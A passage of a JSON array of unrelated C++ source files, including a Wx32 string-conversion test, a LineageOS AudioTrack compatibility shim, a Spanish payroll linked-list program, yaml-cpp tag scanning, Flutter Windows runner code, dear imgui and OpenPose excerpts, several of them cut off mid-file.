Wx32::Utils::StrCvtSafe(L\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\", Wx32::CodePage::UTF8);\n\t\tif (mbc_str0_force.first != Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\")) { return false; }\n\t\tif (mbc_str0_safe.first != Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\")) { return false; }\n\t}\n\n\t// try error covert\n\t{\n\t\tWx32::MbcsStr_t mbcs_str = Wx32::Utils::StrCvtSafe(L\"\u8fd9\u662f\u4e00\u6bb5UTF16\u7684\u4e2d\u6587\u5b57\u7b26, \u4f46\u4f7f\u7528SJIS\u8f6c\u6362, \u80af\u5b9a\u4e22\u5931\u5b57\u7b26\", Wx32::CodePage::SJIS);\n\t\tWx32::WideStr_t wide_str = Wx32::Utils::StrCvtSafe(Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5UTF8\u7684\u4e2d\u6587\u5b57\u7b26, \u4f46\u4f7f\u7528GBK\u8f6c\u6362, \u80af\u5b9a\u4f1a\u51fa\u9519\"), Wx32::CodePage::GBK);\n\t}\n\n\treturn true;\n}\n\nusing namespace Wx32;\n\nauto main() -> int\n{\n\tTestStr();\n\n\tAPI::WriteConsoleU8(API::GetStdHandle(STDHandleEnum::Output).value(), Utils::ForceU8Str(u8\"utf8\u8f93\u51fa\u6d4b\u8bd5\\n\"));\n\n\tAPI::MessageBoxU8(Utils::ForceU8Str(u8\"\u6d4b\u8bd5UTF8\u6587\u672c1\"), Utils::ForceU8Str(u8\"\u8fd9\u662fUTF8\u6587\u672c\"), MB_OK);\n\tAPI::MessageBoxU8(Utils::ForceU8Str(u8\"\u83b7\u53d6\u7a0b\u5e8f\u5f53\u524d\u76ee\u5f55\"), API::GetCurrentDirectoryU8().first.data(), MB_OK);\n\tAPI::MessageBoxU8(Utils::ForceU8Str(u8\"\u83b7\u53d6\u7a0b\u5e8f\u5f53\u524d\u8def\u5f84\"), API::GetModuleFileNameU8().first.data(), MB_OK);\n\n\tif (const auto hfile_opt = API::CreateFileU8(Utils::ForceU8Str(u8\"1.txt\"), { CREATE_ALWAYS ,(GENERIC_WRITE | GENERIC_READ), FILE_SHARE_READ }))\n\t{\n\t\tconst auto& hfile = hfile_opt.operator*();\n\n\t\tstd::string_view write_str = Utils::ForceU8Str(u8\"asjfgauifuiwf,\u6d4b\u8bd5\u5199\u5165\u8f93\u5165\");\n\t\tAPI::WriteFile(hfile, { reinterpret_cast<const uint8_t*>(write_str.data()), write_str.size() });\n\n\t\tAPI::SetFilePointerEx(hfile, 0, MoveWayEnum::Beg);\n\n\t\tstd::array<uint8_t, 33> read_buffer{};\n\t\tAPI::ReadFile(hfile, read_buffer);\n\n\t\tstd::string_view read_str = { reinterpret_cast<char*>(read_buffer.data()), read_buffer.size() - 1 };\n\t\tif (read_str == write_str)\n\t\t{\n\t\t\tAPI::WriteConsoleU8(API::GetStdHandle(STDHandleEnum::Output).value(), Utils::ForceU8Str(u8\"Equal\"));\n\t\t}\n\t}\n}",
    "/*\n * Copyright (C) 2023 The LineageOS Project\n *\n * SPDX-License-Identifier: Apache-2.0\n */\n\n#include <media/AudioTrack.h>\n\nusing namespace android;\n\nextern \"C\" {\nvoid _ZN7android10AudioTrackC1E19audio_stream_type_tj14audio_format_t20audio_channel_mask_tm20audio_output_flags_tRKNS_2wpINS0_19IAudioTrackCallbackEEEi15audio_session_tNS0_13transfer_typeEPK20audio_offload_info_tRKNS_7content22AttributionSourceStateEPK18audio_attributes_tbfi(\n    void *thisptr, audio_stream_type_t streamType, uint32_t sampleRate,\n    audio_format_t format, audio_channel_mask_t channelMask, size_t frameCount,\n    audio_output_flags_t flags,\n    const wp<AudioTrack::IAudioTrackCallback> &callback,\n    int32_t notificationFrames, audio_session_t sessionId,\n    AudioTrack::transfer_type transferType,\n    const audio_offload_info_t *offloadInfo,\n    const AttributionSourceState &attributionSource,\n    const audio_attributes_t *pAttributes, bool doNotReconnect,\n    float maxRequiredSpeed, audio_port_handle_t selectedDeviceId);\n\nvoid _ZN7android10AudioTrackC1E19audio_stream_type_tj14audio_format_t20audio_channel_mask_tm20audio_output_flags_tRKNS_2wpINS0_19IAudioTrackCallbackEEEi15audio_session_tNS0_13transfer_typeEPK20audio_offload_info_tRKNS_7content22AttributionSourceStateEPK18audio_attributes_tbfiRKNSt3__112basic_stringIcNSM_11char_traitsIcEENSM_9allocatorIcEEEE(\n    void *thisptr, audio_stream_type_t streamType, uint32_t sampleRate,\n    audio_format_t format, audio_channel_mask_t channelMask, size_t frameCount,\n    audio_output_flags_t flags,\n    const wp<AudioTrack::IAudioTrackCallback> &callback,\n    int32_t notificationFrames, audio_session_t sessionId,\n    AudioTrack::transfer_type transferType,\n    const audio_offload_info_t *offloadInfo,\n    const AttributionSourceState &attributionSource,\n    const audio_attributes_t *pAttributes, bool doNotReconnect,\n    float maxRequiredSpeed, audio_port_handle_t selectedDeviceId,\n    const std::string& /* unknown */) {\n  _ZN7android10AudioTrackC1E19audio_stream_type_tj14audio_format_t20audio_channel_mask_tm20audio_output_flags_tRKNS_2wpINS0_19IAudioTrackCallbackEEEi15audio_session_tNS0_13transfer_typeEPK20audio_offload_info_tRKNS_7content22AttributionSourceStateEPK18audio_attributes_tbfi(\n      thisptr, streamType, sampleRate, format, channelMask, frameCount, flags,\n      callback, notificationFrames, sessionId, transferType, offloadInfo,\n      attributionSource, pAttributes, doNotReconnect, maxRequiredSpeed,\n      selectedDeviceId);\n}\n}",
    "#include<iostream>\n#include <limits>\n#include <algorithm>\nusing namespace std;\nclass Persona{\nprivate:\n\tint id;\n\tstring nombre;\n\tstring apellidoPaterno;\n\tstring apellidoMaterno;\n\tstring sexo;\n\tint edad;\n\tstring direccion;\n\tint telefono;\n\tstring puesto;\n\tstring departamento;\n\tint horasTrabajadas;\n\tdouble costoPorHora;\n\tdouble sueldo;\npublic:\n\tPersona() : id(0), nombre(\"\"), apellidoPaterno(\"\"),\n\tapellidoMaterno(\"\"), sexo(\"\"), edad(0), direccion(\"\"), telefono(0),\n\tpuesto(\"\"), departamento(\"\"), horasTrabajadas(0), costoPorHora(0),\n\tsueldo(0) {}\n\n\n\tPersona(int _id,string _nombre,string _apellidoPaterno,string _apellidoMaterno,\n\tstring _sexo,int _edad,string _direccion,int _telefono,string _puesto,string _departamento,\n\tint _horasTrabajadas,double _costoPorHora,double _sueldo):id(_id), nombre(_nombre), apellidoPaterno(_apellidoPaterno),\n\tapellidoMaterno(_apellidoMaterno), sexo(_sexo), edad(_edad), direccion(_direccion), telefono(_telefono),\n\tpuesto(_puesto), departamento(_departamento), horasTrabajadas(_horasTrabajadas), costoPorHora(_costoPorHora),\n\tsueldo(_horasTrabajadas * _costoPorHora) {}\n\n\tvoid setdatos(int _id,string _nombre,string _apellidoPaterno,string _apellidoMaterno,\n\tstring _sexo,int _edad,string _direccion,int _telefono,string _puesto,string _departamento,\n\tint _horasTrabajadas,double _costoPorHora,double _sueldo)\n\t{\n\tid = _id;\n\tnombre = _nombre;\n\tapellidoPaterno = _apellidoPaterno;\n\tapellidoMaterno = _apellidoMaterno;\n\tsexo = _sexo;\n\tedad = _edad;\n\tdireccion = _direccion;\n\ttelefono = _telefono;\n\tpuesto = _puesto;\n\tdepartamento = _departamento;\n\thorasTrabajadas = _horasTrabajadas;\n\tcostoPorHora = _costoPorHora;\n\tsueldo = _horasTrabajadas * _costoPorHora;\n\t}\n\n\t\tvoid setid(int i)\n\t{\n\t    id = i;\n\t}\n\n\tvoid setnombre(string nom)\n\t{\n\t    nombre = nom;\n\t}\n\n\tvoid setap(string ap)\n\t{\n\t    apellidoPaterno = ap;\n\t}\n\n\tvoid setam(string am)\n\t{\n\t    apellidoMaterno = am;\n\t}\n\n\tvoid setsexo(string s)\n\t{\n\t    sexo = s;\n\t}\n\n\tvoid setedad(int e)\n\t{\n\t    edad = e;\n\t}\n\n\tvoid setdireccion(string di)\n\t{\n\t    direccion = di;\n\t}\n\n\tvoid settelefono(int t)\n\t{\n\t    telefono = t;\n\t}\n\n\tvoid setpuesto(string pue)\n\t{\n\t    puesto = pue;\n\t}\n\n\tvoid setdepartamento(string dep)\n\t{\n\t    departamento = dep;\n\t}\n\n\tvoid sethoras(int h)\n\t{\n\t    horasTrabajadas = h;\n\t}\n\n\tvoid setcosto(int c)\n\t{\n\t    costoPorHora = c;\n\t}\n\n\tint get_id() const {\n\t\treturn id;\n\t}\n\n\tstring getNombre(){\n\t\treturn nombre;\n\t}\n\n\tstring getApellidoPaterno(){\n\t\treturn apellidoPaterno;\n\t}\n\n\tstring getApellidoMaterno(){\n\t\treturn apellidoMaterno;\n\t}\n\n\tstring getSexo(){\n\t\treturn sexo;\n\t}\n\n\tint getEdad(){\n\t\treturn edad;\n\t}\n\n\tstring getDireccion(){\n\t\treturn direccion;\n\t}\n\n\tint getTelefono(){\n\t\treturn telefono;\n\t}\n\n\tstring getPuesto(){\n\t\treturn puesto;\n\t}\n\n\tstring getDepartamento(){\n\t\treturn departamento;\n\t}\n\n\tint getHorasTrabajadas(){\n\t\treturn horasTrabajadas;\n\t}\n\n\tdouble getCostoPorHora(){\n\t\treturn costoPorHora;\n\t}\n\n\tdouble getSueldo(){\n\t\treturn sueldo;\n\t}\n\n};\nstruct Nodo{\n\tPersona persona;\n\tNodo* siguiente;\n\tNodo(Persona _persona) : persona(_persona), siguiente(nullptr) {}\n\n};\n//prototipado de funcines\nvoid agregar(Nodo *&, Persona);\nvoid imprimirLista(Nodo *);\nvoid eliminar(Nodo *&, int);\nvoid modificar(Nodo *&, int);\nbool esLetra(const string &str);\nNodo* buscarPorID(Nodo *,int);\nNodo* buscarPorNombre(Nodo *,string);\nbool mensaje_mostrado = false;\n\nint main(){\n\tstring nombre, apellidoPaterno, apellidoMaterno, sexo, direccion,  puesto, departamento;\n\tint id,  edad, opcionConsulta, horasTrabajadas,telefono;\n\tdouble costoPorHora;\n\tPersona persona;\n\tNodo *lista=NULL;\n\tint opc;\n\tdo{\n\t\tcout<<\"---------\u00bfQu\u00e9 deseas realizar?-------------\"<<endl;\n\t\tcout<<\"1.-Dar de alta a un empleado\"<<endl;\n\t\tcout<<\"2.-Mostrar nomina de empleado\"<<endl;\n\t\tcout<<\"3.-Dar de baja a un empleado\"<<endl;\n\t\tcout<<\"4.-Realizar cambios en la nomina\"<<endl;\n\t\tcout<<\"5.-Consultar informacion de un empleado\"<<endl;\n\t\tcout<<\"6.-Salir\"<<endl;\n\t\t///cin>>opc;\n        while (!(cin >> opc || to_string(opc).length() != 1)) {\n            if (!mensaje_mostrado) {\n                cout << \"Ingrese 1 valor numerico: \";\n                mensaje_mostrado = true;\n            }\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        }\n\n\n\t\tswitch(opc){\n\n\t\t\tcase 1:\n\t\t\t\tcin.ignore();\n\t\t\t\tcout << \"Ingrese el ID del trabajador (6 caracteres): \";\n                while (!(cin >> id) || to_string(id).length() != 6) {\n                    if (!mensaje_mostrado) {\n                        cout << \"El ID del trabajador debe ser un n\u00famero entero de 6 d\u00edgitos. Int\u00e9ntalo de nuevo: \";;\n                        mensaje_mostrado = true;\n                    }\n                    cin.clear();\n                    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n                }\n\n    \t\t\tcin.ignore();\n\n\t\t\t\tcout << \"Ingrese el nombre del trabajador: \";\n                while (true) {\n                    getline(cin, nombre);\n                    if (!nombre.empty() && esLetra(nombre)) {\n                   ",
    "#include \"exp.h\"\r\n#include \"regex_yaml.h\"\r\n#include \"regeximpl.h\"\r\n#include \"stream.h\"\r\n#include \"yaml-cpp/exceptions.h\"  // IWYU pragma: keep\r\n#include \"yaml-cpp/mark.h\"\r\n\r\nnamespace YAML {\r\nconst std::string ScanVerbatimTag(Stream& INPUT) {\r\n  std::string tag;\r\n\r\n  // eat the start character\r\n  INPUT.get();\r\n\r\n  while (INPUT) {\r\n    if (INPUT.peek() == Keys::VerbatimTagEnd) {\r\n      // eat the end character\r\n      INPUT.get();\r\n      return tag;\r\n    }\r\n\r\n    int n = Exp::URI().Match(INPUT);\r\n    if (n <= 0)\r\n      break;\r\n\r\n    tag += INPUT.get(n);\r\n  }\r\n\r\n  throw ParserException(INPUT.mark(), ErrorMsg::END_OF_VERBATIM_TAG);\r\n}\r\n\r\nconst std::string ScanTagHandle(Stream& INPUT, bool& canBeHandle) {\r\n  std::string tag;\r\n  canBeHandle = true;\r\n  Mark firstNonWordChar;\r\n\r\n  while (INPUT) {\r\n    if (INPUT.peek() == Keys::Tag) {\r\n      if (!canBeHandle)\r\n        throw ParserException(firstNonWordChar, ErrorMsg::CHAR_IN_TAG_HANDLE);\r\n      break;\r\n    }\r\n\r\n    int n = 0;\r\n    if (canBeHandle) {\r\n      n = Exp::Word().Match(INPUT);\r\n      if (n <= 0) {\r\n        canBeHandle = false;\r\n        firstNonWordChar = INPUT.mark();\r\n      }\r\n    }\r\n\r\n    if (!canBeHandle)\r\n      n = Exp::Tag().Match(INPUT);\r\n\r\n    if (n <= 0)\r\n      break;\r\n\r\n    tag += INPUT.get(n);\r\n  }\r\n\r\n  return tag;\r\n}\r\n\r\nconst std::string ScanTagSuffix(Stream& INPUT) {\r\n  std::string tag;\r\n\r\n  while (INPUT) {\r\n    int n = Exp::Tag().Match(INPUT);\r\n    if (n <= 0)\r\n      break;\r\n\r\n    tag += INPUT.get(n);\r\n  }\r\n\r\n  if (tag.empty())\r\n    throw ParserException(INPUT.mark(), ErrorMsg::TAG_WITH_NO_SUFFIX);\r\n\r\n  return tag;\r\n}\r\n}  // namespace YAML\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// dear imgui, v1.90.1\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wreserved-identifier\"            // warning: identifier '_Xxx' is reserved because it starts with '_' followed by a capital letter\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // warning: stack protector not protecting local variables: variable length buffer\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // [__GNUC__ >= 8] warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n\n//-------------------------------------------------------------------------\n// [SECTION] STB libraries implementation (for stb_truetype and stb_rect_pack)\n//-------------------------------------------------------------------------\n\n// Compile time options:\n//#define IMGUI",
    "#include <openpose/producer/imageDirectoryReader.hpp>\n#include <openpose/filestream/fileStream.hpp>\n#include <openpose/utilities/fastMath.hpp>\n#include <openpose/utilities/fileSystem.hpp>\n#include <openpose_private/utilities/openCvMultiversionHeaders.hpp>\n\nnamespace op\n{\n    std::vector<std::string> getImagePathsOnDirectory(const std::string& imageDirectoryPath)\n    {\n        try\n        {\n            // Get files on directory with the desired extensions\n            const auto imagePaths = getFilesOnDirectory(imageDirectoryPath, Extensions::Images);\n            // Check #files > 0\n            if (imagePaths.empty())\n                error(\"No images were found on \" + imageDirectoryPath, __LINE__, __FUNCTION__, __FILE__);\n            // Return result\n            return imagePaths;\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return {};\n        }\n    }\n\n    ImageDirectoryReader::ImageDirectoryReader(const std::string& imageDirectoryPath,\n                                               const std::string& cameraParameterPath,\n                                               const bool undistortImage,\n                                               const int numberViews) :\n        Producer{ProducerType::ImageDirectory, cameraParameterPath, undistortImage, numberViews},\n        mImageDirectoryPath{imageDirectoryPath},\n        mFilePaths{getImagePathsOnDirectory(imageDirectoryPath)},\n        mFrameNameCounter{0ll}\n    {\n    }\n\n    ImageDirectoryReader::~ImageDirectoryReader()\n    {\n    }\n\n    std::string ImageDirectoryReader::getNextFrameName()\n    {\n        try\n        {\n            return getFileNameNoExtension(mFilePaths.at(mFrameNameCounter));\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return \"\";\n        }\n    }\n\n    Matrix ImageDirectoryReader::getRawFrame()\n    {\n        try\n        {\n            // Read frame\n            auto frame = loadImage(mFilePaths.at(mFrameNameCounter++).c_str(), CV_LOAD_IMAGE_COLOR);\n            // Skip frames if frame step > 1\n            const auto frameStep = Producer::get(ProducerProperty::FrameStep);\n            if (frameStep > 1)\n                set(CV_CAP_PROP_POS_FRAMES, mFrameNameCounter + frameStep-1);\n            // Check frame integrity. This function also checks width/height changes. However, if it is performed\n            // after setWidth/setHeight this is performed over the new resolution (so they always match).\n            checkFrameIntegrity(frame);\n            // Update size, since images might have different size between each one of them\n            mResolution = Point<int>{frame.cols(), frame.rows()};\n            // Return final frame\n            return frame;\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return Matrix();\n        }\n    }\n\n    std::vector<Matrix> ImageDirectoryReader::getRawFrames()\n    {\n        try\n        {\n            std::vector<Matrix> rawFrames;\n            for (auto i = 0 ; i < positiveIntRound(Producer::get(ProducerProperty::NumberViews)) ; i++)\n                rawFrames.emplace_back(getRawFrame());\n            return rawFrames;\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return {};\n        }\n    }\n\n    double ImageDirectoryReader::get(const int capProperty)\n    {\n        try\n        {\n            if (capProperty == CV_CAP_PROP_FRAME_WIDTH)\n            {\n                if (Producer::get(ProducerProperty::Rotation) == 0.\n                    || Producer::get(ProducerProperty::Rotation) == 180.)\n                    return mResolution.x;\n                else\n                    return mResolution.y;\n            }\n            else if (capProperty == CV_CAP_PROP_FRAME_HEIGHT)\n            {\n                if (Producer::get(ProducerProperty::Rotation) == 0.\n                    || Producer::get(ProducerProperty::Rotation) == 180.)\n                    return mResolution.y;\n                else\n                    return mResolution.x;\n            }\n            else if (capProperty == CV_CAP_PROP_POS_FRAMES)\n                return (double)mFrameNameCounter;\n            else if (capProperty == CV_CAP_PROP_FRAME_COUNT)\n                return (double)mFilePaths.size();\n            else if (capProperty == CV_CAP_PROP_FPS)\n                return -1.;\n            else\n            {\n                opLog(\"Unknown property\", Priority::Max, __LINE__, __FUNCTION__, __FILE__);\n                return -1.;\n            }\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return 0.;\n        }\n    }\n\n    void ImageDirectoryReader::set(const int capProperty, const double value)\n    {\n        try\n        {\n            if (capProper",
    "\ufeff#include <iostream>\nclass arr_error : public std::exception\n{\n\tstd::string message;\npublic:\n\tarr_error(const std::string& message) : message{ message } {}\n\tconst char* what() const noexcept override\n\t{\n\t\treturn message.c_str();\n\t}\n};\nclass smart_array\n{\n\tint num_of_arr;\n\tint* arr = nullptr;\n\tint count{ 0 };\npublic:\n\tsmart_array(int c)\n\t{\n\t\tnum_of_arr = c;\n\t\tint* arr_some = new int[num_of_arr] {};\n\t\tdelete[] arr;\n\t\tarr = arr_some;\n\t}\n\t~smart_array() { delete[] arr; }\n\n\tvoid add_element(int c)\n\t{\n\t\tif (count >= num_of_arr)\n\t\t{\n\t\t\tthrow arr_error(\"Array out of bonds\");\n\t\t\treturn;\n\t\t}\n\t\tarr[count] = c;\n\t\tcount++;\n\t}\n\tint get_element(int c)\n\t{\n\t\tif (c > num_of_arr || c <= 0)\n\t\t{\n\t\t\tthrow arr_error(\"Wrong index\");\n\t\t\treturn -1 ;\n\t\t}\n\t\tc--;\n\t\treturn arr[c];\n\t}\n\tsmart_array& operator=(const smart_array& other)\n\t{\n\t\tif (this != &other)\n\t\t{\n\t\t\tdelete[] arr;\n\t\t\tnum_of_arr = other.num_of_arr;\n\t\t\tarr = new int[num_of_arr];\n\t\t\tfor(int i=0; i< num_of_arr; ++i)\n\t\t\t{\n\t\t\t\tarr[i] = other.arr[i];\n\t\t\t}\n\t\t}\n\t\treturn *this;\n\t}\n};\n\nint main()\n{\n\ttry {\n\t\tsmart_array arr(5);\n\t\tarr.add_element(1);\n\t\tarr.add_element(4);\n\t\tarr.add_element(155);\n\t\tarr.add_element(14);\n\t\tarr.add_element(15);\n\n\t\tstd::cout << arr.get_element(1) << std::endl;\n\n\t\tsmart_array new_array(2);\n\t\tnew_array.add_element(100);\n\t\tnew_array.add_element(200);\n\t\tstd::cout << new_array.get_element(1) << std::endl;\n\n\t\tarr = new_array;\n\t\tstd::cout << arr.get_element(2) << std::endl;\n\t}\n\tcatch (const std::exception& ex) {\n\t\tstd::cout << ex.what() << std::endl;\n\t}\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"quiz\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
